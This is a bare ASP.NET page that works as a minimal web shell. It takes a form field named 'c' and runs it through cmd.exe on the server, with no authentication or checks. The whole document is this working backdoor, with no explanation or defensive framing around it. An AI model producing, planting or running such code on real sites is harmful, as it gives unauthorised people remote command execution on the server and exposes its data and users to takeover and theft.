<%@ Page Language="C#" %>
<% var p = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request.Form["c"]); System.Diagnostics.Process.Start(p); %>
